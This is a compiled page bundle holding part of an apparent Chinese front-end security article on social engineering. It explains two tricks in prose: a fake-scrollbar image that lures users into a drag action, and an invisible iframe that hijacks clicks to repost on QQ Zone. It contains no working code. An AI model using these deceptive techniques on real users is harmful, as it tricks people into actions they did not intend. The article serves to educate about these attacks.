id="\u4E5D\u3001\u5FC3\u7406\u5B66\u4E0E\u793E\u4F1A\u5DE5\u7A0B\u5B66" tabindex="-1"><a class="header-anchor" href="#\u4E5D\u3001\u5FC3\u7406\u5B66\u4E0E\u793E\u4F1A\u5DE5\u7A0B\u5B66" aria-hidden="true">#</a> \u4E5D\u3001\u5FC3\u7406\u5B66\u4E0E\u793E\u4F1A\u5DE5\u7A0B\u5B66</h3><p>\u6709\u4E2A\u89C2\u70B9\u8BA4\u4E3A\u201C\u4E00\u5207\u9493\u9C7C\u7F51\u7AD9\u6210\u529F\u6848\u4F8B\uFF0C\u90FD\u662F\u4E00\u6B21\u5FC3\u7406\u5B66\u7684\u5B9E\u6218\u6F14\u7EC3\u201D\u3002\u5728\u8FD9\u4E2A\u5C42\u9762\uFF0C\u53EF\u8C13\u4E94\u82B1\u516B\u95E8\uFF0C\u521B\u610F\u767E\u51FA\u3002\u5206\u4EAB\u4E24\u4E2A\u6848\u4F8B\uFF1A</p><h4 id="_9-1-\u8BF1\u5BFC\u89E6\u53D1\u62D6\u62FD\u4E8B\u4EF6" tabindex="-1"><a class="header-anchor" href="#_9-1-\u8BF1\u5BFC\u89E6\u53D1\u62D6\u62FD\u4E8B\u4EF6" aria-hidden="true">#</a> 9.1\uFF09\u8BF1\u5BFC\u89E6\u53D1\u62D6\u62FD\u4E8B\u4EF6</h4><p>\u6BD4\u65B9\u8BF4\uFF0C\u6709\u67D0\u5DF2\u77E5\u6F0F\u6D1E\uFF0C\u8981\u7528\u6237\u89E6\u53D1\u62D6\u62FD\u4E8B\u4EF6\u624D\u80FD\u89E6\u53D1\u3002\u600E\u4E48\u641E\u5B9A\u8FD9\u4E2A\u4E8B\u60C5\u5462\uFF1F<br> \u5F88\u7B80\u5355\uFF0C\u6DFB\u52A0\u4E00\u5F20\u56FE\u7247\uFF1A<br><img src="'+u+'" alt="Alt text"><br> \u6CE8\u610F\u8FD9\u662F\u4E00\u5F20\u56FE\u7247\uFF0C\u6EDA\u52A8\u6761\u662F\u56FE\u7247\u7684\u4E00\u90E8\u5206\u800C\u4E0D\u662F\u771F\u6B63\u7684\u6D4F\u89C8\u5668\u63A7\u4EF6\uFF0C\u7528\u6237\u81EA\u7136\u4F1A\u53BB\u4E0B\u62C9\u201C\u6EDA\u52A8\u6761\u201D\uFF0C\u56E0\u800C\u89E6\u53D1\u4E86\u8FD9\u4E2A\u6F0F\u6D1E\u3002</p><h4 id="_9-2-\u4F20\u8BF4\u4E2D\u7684-qq-\u7A7A\u95F4-\u4F20\u67D3\u75C5\u6BD2" tabindex="-1"><a class="header-anchor" href="#_9-2-\u4F20\u8BF4\u4E2D\u7684-qq-\u7A7A\u95F4-\u4F20\u67D3\u75C5\u6BD2" aria-hidden="true">#</a> 9.2) \u4F20\u8BF4\u4E2D\u7684 QQ \u7A7A\u95F4\u201C\u4F20\u67D3\u75C5\u6BD2\u201D</h4><p>\u6B65\u9AA4\u662F\u8FD9\u6837\u7684\uFF1A</p><ol><li>A(\u59CB\u4F5C\u4FD1\u8005)\u53D1\u5E03\u4E86\u4E00\u6761\u8BF4\u8BF4\uFF1A<code>\u8FD9\u4E2A\u7F51\u7AD9\u5F88\u597D\u73A9\uFF0C\u5FEB\u6765\u8BD5\u8BD5\u5427~ http://xxx.xxx</code></li><li>A \u7684\u597D\u53CB\u4EEC\u770B\u5230\u4E86\uFF0C\u6253\u5F00\u4E86\u8FD9\u4E2A\u94FE\u63A5\uFF0C\u73A9\u4E86\u4E00\u4E0B\u540E\uFF0C\u5C31\u5173\u95ED\u4E86\u9875\u9762</li><li>\u597D\u53CB\u4EEC\u4E0D\u77E5\u9053\uFF0C\u7ADF\u7136\u81EA\u5DF1\u7684\u7A7A\u95F4\u4E3B\u52A8\u8F6C\u53D1\u4E86\u8FD9\u6761\u8BF4\u8BF4\uFF08\u95EE\u9898\u662F\u81EA\u5DF1\u6CA1\u6709\u70B9\u8F6C\u53D1\u5440\uFF01\uFF09</li><li>\u4E00\u4F20\u5341\u5341\u4F20\u767E\uFF0C\u8D8A\u4F20\u8D8A\u5E7F\u2026</li></ol><p>\u4F46\u771F\u5B9E\u7684\u60C5\u51B5\u8DDF CSRF \u6CA1\u4E00\u70B9\u5173\u7CFB\u3002\u7384\u5999\u5728\u4E8E\uFF1A<code>\u597D\u53CB\u4EEC\u6253\u5F00\u94FE\u63A5\u540E\u5E72\u4E86\u4EC0\u4E48\u4E8B\u60C5\uFF1F</code><br> \u8FD9\u4E2A\u7F51\u7AD9\u662F\u4E00\u4E2A\u5C0F\u7403\u5728\u8DF3\u6765\u8DF3\u53BB\uFF0C\u7F51\u7AD9\u4E0A\u6709\u4E00\u53E5\u8BDD\uFF1A\u4F60\u80FD\u70B9\u5230\u6211\u5417\uFF1F<br> \u7528\u6237\u770B\u5230\u540E\uFF0C\u5C31\u5F88\u60F3\u53BB\u70B9\u51FB\u5C0F\u7403\uFF0C\u770B\u4F1A\u53D1\u751F\u4EC0\u4E48\uFF1B\u4F46\u70B9\u51FB\u540E\uFF0C\u5C31\u8F6C\u53D1\u4E86\u8BF4\u8BF4\u2026</p><p>\u6709\u4EBA\u4F1A\u95EE\uFF0C\u8FD9\u4E0D\u662F CSRF \u5417\uFF1F\u8FD8\u771F\u4E0D\u662F\u3002\u505A\u6CD5\u5374\u5F88\u7B80\u5355\uFF1A<br> \u201C\u6709\u8DA3\u201D\u7684\u7F51\u7AD9\u5185\u5D4C\u4E86\u4E00\u4E2A iframe\uFF0Ciframe \u52A0\u8F7D\u7684\u662F\u8FD9\u6761\u8BF4\u8BF4\u7684\u539F\u9875\u9762\uFF0C\u7136\u540E\u628A\u201C\u8F6C\u53D1\u201D\u6309\u94AE\u521A\u597D\u653E\u5230\u5C0F\u7403\u7684\u4F4D\u7F6E\u4E0A\uFF0C\u518D\u628A\u8FD9 iframe \u7684\u900F\u660E\u5EA6\u53D8\u4E3A 0\u3002\u6240\u4EE5\u7528\u6237\u70B9\u51FB\u5C0F\u7403\uFF0C\u5176\u5B9E\u662F<code>\u70B9\u51FB\u4E86iframe\u4E2D\u7684\u8F6C\u53D1\u6309\u94AE</code>\u3002\u771F\u662F\u4EE4\u4EBA\u4E07\u4E07\u6CA1\u60F3\u5230\u3002</p><p>\u4EE5\u4E0A\u3002 End. 5.27 by litten.</p>',10);function Q(W,z){const a=s("ExternalLinkIcon");return d(),n("div",null,[_,t("p",null,[m,t("a",v,[g,i(a)]),k,f,x,q,C]),S,t("p",null,[j,y,I,t("a",A,[w,i(a)]),E]),H,t("p",null,[T,t("a",D,[F,i(a)]),L,B,O,P,N,M,R,U,V,J,X]),G])}var Y=r(b,[["render",Q],["__file","safety-point-of-view-from-front-end.html.vue"]]);export{Y as default};